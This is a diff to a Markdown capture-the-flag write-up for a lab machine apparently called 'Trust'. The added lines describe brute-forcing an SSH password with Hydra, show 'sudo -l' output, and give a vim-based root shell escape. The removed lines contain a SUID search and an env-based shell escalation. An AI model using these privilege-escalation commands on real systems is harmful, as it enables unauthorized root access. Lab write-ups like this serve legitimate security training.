@@ -34,9 +34,12 @@ We find a suspicious file named secreto.php. When we access this file through th
 
 ![Descripción de Trust](Imagenes/Trust_3.png)
 
-We observe one user that we can try with the SSH service.
+There appears to be one user account that we can try to access via SSH.
 
-to access the SSH service, we need a pa
+We need to find out the password to access the SSH service. For this, we're going to use the Hydra tool
+![Descripción de Trust](Imagenes/Trust_4.png)
+
+It´s done!  the password is chocolate!! 
 
 ## Privilege Escalation
 
@@ -47,32 +50,22 @@ To find these files, we need to execute this command:
 ```ruby
 sudo -l
 ```
-We notice that we can't execute this command because it doesn't exist. So, we can search for binaries with SUID permissions using this command:
+
+we have this result:
 
 ```ruby
-find / -perm -4000 -user root 2>/dev/null
+mario@385984ff1c20:~$ sudo -l
+[sudo] password for mario: 
+Matching Defaults entries for mario on 385984ff1c20:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty
+
+User mario may run the following commands on 385984ff1c20:
+    (ALL) /usr/bin/vim
+mario@385984ff1c20:~$
 ```
 
-we obtain this results:
+We can execute the command 'vim' as root user, so I found in GTFOBins how to exploit it
 
 ```ruby
-/usr/lib/openssh/ssh-keysign
-/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-/usr/bin/newgrp
-/usr/bin/su
-/usr/bin/env
-/usr/bin/umount
-/usr/bin/passwd
-/usr/bin/mount
-/usr/bin/chsh
-/usr/bin/gpasswd
-/usr/bin/chfn
+sudo vim -c ':!/bin/sh'
 ```
-
-If we examine the different results, we find a binary file named "env". We can execute this command to potentially gain root privileges:
-
-```ruby
-/usr/bin/env /bin/sh -p
-```
-
-Finally, we gain access as the root user.
